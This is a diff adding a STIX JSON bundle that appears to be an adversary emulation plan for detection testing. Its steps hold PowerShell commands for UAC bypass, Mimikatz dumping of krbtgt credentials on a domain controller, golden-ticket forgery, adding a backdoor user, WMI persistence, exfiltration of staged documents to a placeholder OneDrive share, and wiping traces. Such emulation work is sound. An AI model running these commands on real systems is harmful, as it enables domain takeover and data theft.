+            "description": "Invoke UAC bypass sdctl",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1134.002",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": ". .\\stepFourteen_bypassUAC.ps1;\nbypass;\n",
+                                "payloads": [
+                                    "stepFourteen_bypassUAC.ps1"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Access Token Manipulation: Create Process with Token"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--e1b9fed8-8ddf-4ccb-9809-8cff44688562",
+            "created": "2024-02-03T15:12:49.209627Z",
+            "modified": "2024-02-03T15:12:49.209627Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--5226e5dc-fc28-43b7-a679-0db49d520402"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--4ef6009d-2d62-4bb4-8de9-0458df2e9567",
+            "created": "2024-02-03T15:12:49.209854Z",
+            "modified": "2024-02-03T15:12:49.209854Z",
+            "name": "Credential Dumping",
+            "description": "Dumping credentials via wmidump (Mimikatz)",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1003",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": ". .\\stepFourteen_credDump.ps1;\n",
+                                "payloads": [
+                                    "stepFourteen_credDump.ps1"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Credential Dumping"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--94ff5350-334e-4893-b7f9-e3ed0d3077d6",
+            "created": "2024-02-03T15:12:49.210061Z",
+            "modified": "2024-02-03T15:12:49.210061Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--4ef6009d-2d62-4bb4-8de9-0458df2e9567"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--1dba454c-0e4f-4fe0-8bc9-b17e8c5c9a24",
+            "created": "2024-02-03T15:12:49.21029Z",
+            "modified": "2024-02-03T15:12:49.21029Z",
+            "name": "Stage Mimikatz Binary",
+            "description": "Staging Mimikatz Binary for later execution",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1003",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "write-host \"[+] Successfully downloaded m.exe\";\n",
+                                "payloads": [
+                                    "m.exe"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Credential Dumping"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--8b55a74f-e4df-46a7-b7de-6f143778def0",
+            "created": "2024-02-03T15:12:49.210478Z",
+            "modified": "2024-02-03T15:12:49.210478Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--1dba454c-0e4f-4fe0-8bc9-b17e8c5c9a24"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--43aad2d6-d16a-4adb-aa2b-9510a3be4c52",
+            "created": "2024-02-03T15:12:49.210685Z",
+            "modified": "2024-02-03T15:12:49.210685Z",
+            "name": "WMI Persistence technique",
+            "description": "user triage",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1546.003",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "Get-WmiObject -Namespace \"root/subscription\" -list | findstr /i \"__Filter\";\nif ($?) {\n  write-host \"[*] WMI script has already executed on this machine. Not loading and executing wmi script.\";\n  exit 1;\n} else {\n  . .\\stepFifteen_wmi.ps1;\n  wmi;\n  if ($?) {\n    write-host \"[+] WMI script has successfully executed!\";\n    exit 0;\n  }\n  exit 1;\n}\n",
+                                "payloads": [
+                                    "stepFifteen_wmi.ps1"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Event Triggered Execution: Windows Management Instrumentation Event Subscription"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--2629c081-b96c-4ab7-b1fe-db08b9b3f893",
+            "created": "2024-02-03T15:12:49.210872Z",
+            "modified": "2024-02-03T15:12:49.210872Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--43aad2d6-d16a-4adb-aa2b-9510a3be4c52"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--1c8552c7-f7ed-4523-b640-72d65af5f855",
+            "created": "2024-02-03T15:12:49.211107Z",
+            "modified": "2024-02-03T15:12:49.211107Z",
+            "name": "Enumerate Domain Controller",
+            "description": "Get domain controller and current user SID for the domain",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1018",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": ". .\\powerview.ps1;\nget-netdomaincontroller;\n",
+                                "payloads": [
+                                    "powerview.ps1"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Remote System Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--c0c70013-d5af-466b-a32a-22979fb9af81",
+            "created": "2024-02-03T15:12:49.211311Z",
+            "modified": "2024-02-03T15:12:49.211311Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--1c8552c7-f7ed-4523-b640-72d65af5f855"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--a42be479-fc26-4d7c-9e63-7a9b74e4c8d2",
+            "created": "2024-02-03T15:12:49.211538Z",
+            "modified": "2024-02-03T15:12:49.211538Z",
+            "name": "Enumerate Domain SID",
+            "description": "Get domain user SID",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1033",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": ". .\\stepSixteen_SID.ps1;\nsiduser;\n",
+                                "payloads": [
+                                    "stepSixteen_SID.ps1"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "System Owner/User Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--af39aaef-151f-48a6-8b7e-44032b07d9c9",
+            "created": "2024-02-03T15:12:49.211968Z",
+            "modified": "2024-02-03T15:12:49.211968Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--a42be479-fc26-4d7c-9e63-7a9b74e4c8d2"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--acecc8f7-18c2-41fd-87bc-39ffd644e4e9",
+            "created": "2024-02-03T15:12:49.212209Z",
+            "modified": "2024-02-03T15:12:49.212209Z",
+            "name": "Remote Connection (T1028) & Remote File Copy (T1105) & Credential Dumping",
+            "description": "Establish connection to Domain Controller",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1105",
+                    "input_arguments": {
+                        "target.winrm.password": {
+                            "default": "Password123!",
+                            "description": "Password for winrm target user",
+                            "type": "string"
+                        },
+                        "target.winrm.remote_host": {
+                            "default": "192.0.2.20",
+                            "description": "IP or Hostname of remote host",
+                            "type": "string"
+                        },
+                        "target.winrm.username": {
+                            "default": "Administrator",
+                            "description": "Username of winrm target",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": ". .\\invoke-winrmsession.ps1;\n$session = invoke-winrmsession -Username \"#{target.winrm.username}\" -Password \"#{target.winrm.password}\" -IPAddress \"#{target.winrm.remote_host}\";\nCopy-Item m.exe -Destination \"C:\\Windows\\System32\\\\\" -ToSession $session -force;\nif ($?) {\n  write-host \"[+] Successfully copied m.exe to remote host\";\n} else {\n  write-host \"[!] Error, copying and executing m.exe on remote host\";\n}\nInvoke-Command -Session $session -scriptblock {C:\\Windows\\System32\\m.exe privilege::debug \"lsadump::lsa /inject /name:krbtgt\" exit} | out-string\n",
+                                "payloads": [
+                                    "invoke-winrmsession.ps1",
+                                    "m.exe"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Ingress Tool Transfer"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--883c3ee2-3f2f-44e0-8fe6-443f2c1af8b9",
+            "created": "2024-02-03T15:12:49.212766Z",
+            "modified": "2024-02-03T15:12:49.212766Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--acecc8f7-18c2-41fd-87bc-39ffd644e4e9",
+            "target_ref": "user-account--e9dbdf7c-3f27-52df-805a-90834ad4853f"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--e9dbdf7c-3f27-52df-805a-90834ad4853f",
+            "account_login": "Administrator"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--7cb7385a-6ec3-4eae-bc0e-27e7dd2ee85a",
+            "created": "2024-02-03T15:12:49.214528Z",
+            "modified": "2024-02-03T15:12:49.214528Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--acecc8f7-18c2-41fd-87bc-39ffd644e4e9",
+            "target_ref": "user-account--73fb7825-f39b-45a8-b21a-f9130d7d3a73"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--73fb7825-f39b-45a8-b21a-f9130d7d3a73",
+            "credential": "Password123!"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--4cbfc1aa-9d77-4b38-9db2-0c4be4ec8f87",
+            "created": "2024-02-03T15:12:49.215816Z",
+            "modified": "2024-02-03T15:12:49.215816Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--acecc8f7-18c2-41fd-87bc-39ffd644e4e9",
+            "target_ref": "ipv4-addr--7b20f141-4a12-50b6-a9ce-a0621eff28f0"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--7b20f141-4a12-50b6-a9ce-a0621eff28f0",
+            "value": "192.0.2.20"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--b2b1a133-c257-4f17-bda6-276e8818ee7a",
+            "created": "2024-02-03T15:12:49.216179Z",
+            "modified": "2024-02-03T15:12:49.216179Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--acecc8f7-18c2-41fd-87bc-39ffd644e4e9"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--b1dcc53a-c86c-46ba-8a3d-e1da74a8db3c",
+            "created": "2024-02-03T15:12:49.216486Z",
+            "modified": "2024-02-03T15:12:49.216486Z",
+            "name": "Collect E-mails",
+            "description": "Perform e-mail collection from custom PowerShell module.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1114.001",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": ". .\\stepSeventeen_email.ps1;\nWrite-Host \"Emails Collected\";\n",
+                                "payloads": [
+                                    "stepSeventeen_email.ps1"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Email Collection: Local Email Collection"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--c39ec811-4745-4a16-99b1-d30c5c711992",
+            "created": "2024-02-03T15:12:49.21679Z",
+            "modified": "2024-02-03T15:12:49.21679Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--b1dcc53a-c86c-46ba-8a3d-e1da74a8db3c"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--fc231955-774f-442c-ac0e-e74dfda50c5c",
+            "created": "2024-02-03T15:12:49.217104Z",
+            "modified": "2024-02-03T15:12:49.217104Z",
+            "name": "Collect Files & Compress Collection",
+            "description": "Collect a specific document from a target machine.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1005",
+                    "input_arguments": {
+                        "profile_user_day2": {
+                            "default": "Administrator",
+                            "description": "Name of profile user",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "try{\n  if (!(test-path -path \"C:\\Windows\\Temp\\WindowsParentalControlMigration\" -ErrorAction Stop)) {\n    New-Item -Path \"C:\\Windows\\temp\\\" -Name \"WindowsParentalControlMigration\" -ItemType \"directory\" -force;\n  }\n} catch {\n  write-host \"[!] Access is denied. Manually browse to C:\\Windows\\Temp via Explorer and accept prompt\";\n  exit 1;\n}\n\nif (! (test-path -path \"C:\\Users\\#{profile_user_day2}\\Documents\\MITRE-ATTACK-EVALS.HTML\")) {\n  write-host \"[!] Error, MITRE-ATTACK-EVALS.HTML was not found.\";\n  exit 1;\n}\nCopy-Item \"C:\\Users\\#{profile_user_day2}\\Documents\\MITRE-ATTACK-EVALS.HTML\" -Destination \"C:\\Windows\\Temp\\WindowsParentalControlMigration\" -force;\n. .\\stepSeventeen_zip.ps1;\nzip C:\\Windows\\Temp\\WindowsParentalControlMigration.tmp C:\\Windows\\Temp\\WindowsParentalControlMigration;\nif ($?) {\n  write-host \"[+] Documents successfully staged for collection.\";\n}\n",
+                                "payloads": [
+                                    "stepSeventeen_zip.ps1"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Data from Local System"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--24ad1dcc-9b92-459e-a4e5-df97a6c24da4",
+            "created": "2024-02-03T15:12:49.217802Z",
+            "modified": "2024-02-03T15:12:49.217802Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--fc231955-774f-442c-ac0e-e74dfda50c5c",
+            "target_ref": "user-account--e9dbdf7c-3f27-52df-805a-90834ad4853f"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--e9dbdf7c-3f27-52df-805a-90834ad4853f",
+            "account_login": "Administrator"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--8464231f-f1b6-4402-9116-6496790f8372",
+            "created": "2024-02-03T15:12:49.218158Z",
+            "modified": "2024-02-03T15:12:49.218158Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--fc231955-774f-442c-ac0e-e74dfda50c5c"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--4840d6dd-da13-401a-be46-05db56f4e1e0",
+            "created": "2024-02-03T15:12:49.218463Z",
+            "modified": "2024-02-03T15:12:49.218463Z",
+            "name": "Exfiltrate data to OneDrive",
+            "description": "Transfer data to a OneDrive account",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1537",
+                    "input_arguments": {
+                        "onedrive.password": {
+                            "default": "Password123!",
+                            "description": "Password for OneDrive authentication",
+                            "type": "string"
+                        },
+                        "onedrive.url": {
+                            "default": "https://contoso-my.sharepoint.com/personal/johnd_contoso_onmicrosoft_com/",
+                            "description": "URL for OneDrive net drive",
+                            "type": "URL"
+                        },
+                        "onedrive.username": {
+                            "default": "Administrator",
+                            "description": "Username for OneDrive authentication",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "$err = $(net use y: #{onedrive.url} /user:#{onedrive.username} \"#{onedrive.password}\" 2>&1);\nif($err -Like \"*System error 85*\") {\n  Write-Host \"OneDrive net drive is already mounted!\";\n} elseif($err -Like \"*System error 67*\") {\n  Write-Host \"OneDrive net drive mount failed - Check URL!\";\n  Write-Host \"#{onedrive.url}\";\n  exit 1;\n} elseif($err -Like \"*System error 1244*\") {\n  Write-Host \"Could not authenticate to OneDrive - Check Creds!\";\n  Write-Host \"User: #{onedrive.username}\";\n  Write-Host \"Password: #{onedrive.password}\";\n  exit 1;\n}\n\nWrite-Host \"Mount Successful\"\nCopy-Item \"C:\\Windows\\Temp\\WindowsParentalControlMigration.tmp\" -Destination \"y:\\WindowsParentalControlMigration.tmp\" -Force;\nif(!$?){\n  exit 1;\n}\n\nWrite-Host \"Copy Successfull\"\nexit 0;\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Transfer Data to Cloud Account"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--8d354e72-886a-4abe-bcf3-02a21bd739f5",
+            "created": "2024-02-03T15:12:49.219219Z",
+            "modified": "2024-02-03T15:12:49.219219Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--4840d6dd-da13-401a-be46-05db56f4e1e0",
+            "target_ref": "url--01e63645-3e2d-50d0-8ecb-9d8129940724"
+        },
+        {
+            "type": "url",
+            "spec_version": "2.1",
+            "id": "url--01e63645-3e2d-50d0-8ecb-9d8129940724",
+            "value": "https://contoso-my.sharepoint.com/personal/johnd_contoso_onmicrosoft_com/"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--f51e5114-72d8-4019-b4fd-249f69fdbc74",
+            "created": "2024-02-03T15:12:49.2202Z",
+            "modified": "2024-02-03T15:12:49.2202Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--4840d6dd-da13-401a-be46-05db56f4e1e0",
+            "target_ref": "user-account--e9dbdf7c-3f27-52df-805a-90834ad4853f"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--e9dbdf7c-3f27-52df-805a-90834ad4853f",
+            "account_login": "Administrator"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--e489c8fd-966b-4fd5-9c67-e1863dcfc6e2",
+            "created": "2024-02-03T15:12:49.221022Z",
+            "modified": "2024-02-03T15:12:49.221022Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--4840d6dd-da13-401a-be46-05db56f4e1e0",
+            "target_ref": "directory--25f4c268-64b4-5f09-ad37-c49aea14d304"
+        },
+        {
+            "type": "directory",
+            "spec_version": "2.1",
+            "id": "directory--25f4c268-64b4-5f09-ad37-c49aea14d304",
+            "path": "Password123!"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--506382cd-56a0-45c3-ae5a-01ddf94d9766",
+            "created": "2024-02-03T15:12:49.221529Z",
+            "modified": "2024-02-03T15:12:49.221529Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--4840d6dd-da13-401a-be46-05db56f4e1e0"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--f820b93d-6176-4a72-a138-a70b0b549c49",
+            "created": "2024-02-03T15:12:49.221879Z",
+            "modified": "2024-02-03T15:12:49.221879Z",
+            "name": "Data Wiping of staged files",
+            "description": "Securely delete previously staged files.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1561.001",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": ". .\\wipe.ps1;\nwipe \"m.exe\";\nwipe \"C:\\Windows\\Temp\\WindowsParentalControlMigration.tmp\";\nwipe \"C:\\Windows\\Temp\\WindowsParentalControlMigration\\MITRE-ATTACK-EVALS.HTML\";\n",
+                                "payloads": [
+                                    "wipe.ps1"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Disk Wipe: Disk Content Wipe"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--6af0e645-1482-471c-8048-322d1b35b2ae",
+            "created": "2024-02-03T15:12:49.222387Z",
+            "modified": "2024-02-03T15:12:49.222387Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--f820b93d-6176-4a72-a138-a70b0b549c49"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--267bad86-3f06-49f1-9a3e-6522f2a61e7a",
+            "created": "2024-02-03T15:12:49.222742Z",
+            "modified": "2024-02-03T15:12:49.222742Z",
+            "name": "Execute Invoke-Mimikatz",
+            "description": "Perfofrm Mimikatz credential collection",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1003",
+                    "input_arguments": {
+                        "target.domain.name": {
+                            "default": "domain",
+                            "description": "Target domain name",
+                            "type": "string"
+                        },
+                        "target.ntlm": {
+                            "default": "855c3697d9979e78ac404c4ba2c66533",
+                            "description": "NTLM hash for target user",
+                            "type": "string"
+                        },
+                        "target.sid": {
+                            "default": "S-1-5-21-1004336348-1177238915-682003330-512",
+                            "description": "SID for target user",
+                            "type": "string"
+                        },
+                        "target.winrm.username": {
+                            "default": "Administrator",
+                            "description": "Username for winrm target user",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "klist purge;\n. .\\Invoke-Mimikatz.ps1;\ninvoke-mimikatz -command \"kerberos::golden /domain:#{target.domain.name} /sid:#{target.sid}  /rc4:#{target.ntlm} /user:#{target.winrm.username} /ptt\";\nklist;\ninvoke-command -ComputerName scranton -ScriptBlock {net user /add toby \"pamBeesly<3\"};\n",
+                                "payloads": [
+                                    "Invoke-Mimikatz.ps1"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Credential Dumping"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--97743232-a481-4ac1-9928-3adf04e0ff98",
+            "created": "2024-02-03T15:12:49.223417Z",
+            "modified": "2024-02-03T15:12:49.223417Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--267bad86-3f06-49f1-9a3e-6522f2a61e7a",
+            "target_ref": "domain-name--9d1d8738-d280-5a6f-91db-55fb8982d1b9"
+        },
+        {
+            "type": "domain-name",
+            "spec_version": "2.1",
+            "id": "domain-name--9d1d8738-d280-5a6f-91db-55fb8982d1b9",
+            "value": "domain"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--49f8d81c-ecbf-4ba9-85a9-25f0560db49b",
+            "created": "2024-02-03T15:12:49.223999Z",
+            "modified": "2024-02-03T15:12:49.223999Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--267bad86-3f06-49f1-9a3e-6522f2a61e7a",
+            "target_ref": "user-account--e856ba4c-bdc1-5a79-a3d0-221a1e4fe7fb"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--e856ba4c-bdc1-5a79-a3d0-221a1e4fe7fb",
+            "account_login": "S-1-5-21-1004336348-1177238915-682003330-512"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--f7a67aa9-bc02-4458-a474-24860911548a",
+            "created": "2024-02-03T15:12:49.224516Z",
+            "modified": "2024-02-03T15:12:49.224516Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--267bad86-3f06-49f1-9a3e-6522f2a61e7a",
+            "target_ref": "user-account--d33e4d9b-197e-5067-a683-86e763d67f4f"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--d33e4d9b-197e-5067-a683-86e763d67f4f",
+            "account_login": "855c3697d9979e78ac404c4ba2c66533"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--cb8d71fb-5521-4171-a161-f23d56010162",
+            "created": "2024-02-03T15:12:49.225027Z",
+            "modified": "2024-02-03T15:12:49.225027Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--267bad86-3f06-49f1-9a3e-6522f2a61e7a",
+            "target_ref": "user-account--e9dbdf7c-3f27-52df-805a-90834ad4853f"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--e9dbdf7c-3f27-52df-805a-90834ad4853f",
+            "account_login": "Administrator"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--74f4e34b-8987-4205-a65c-e35fd93ab64c",
+            "created": "2024-02-03T15:12:49.225281Z",
+            "modified": "2024-02-03T15:12:49.225281Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--267bad86-3f06-49f1-9a3e-6522f2a61e7a"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--afb8d8f7-d059-4825-95ae-c5727e2db320",
+            "created": "2024-02-03T15:12:49.2255Z",
+            "modified": "2024-02-03T15:12:49.2255Z",
+            "name": "Triggering Persistent",
+            "description": "Trigger RegKey persistence by rebooting the machine",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1218.011",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "Restart-Computer -Force;\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Signed Binary Proxy Execution: Rundll32"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--1e7c9b36-9d0f-46d5-b3f6-376bdb5aa338",
+            "created": "2024-02-03T15:12:49.225726Z",
+            "modified": "2024-02-03T15:12:49.225726Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--afb8d8f7-d059-4825-95ae-c5727e2db320"
+        }
+    ]
+}
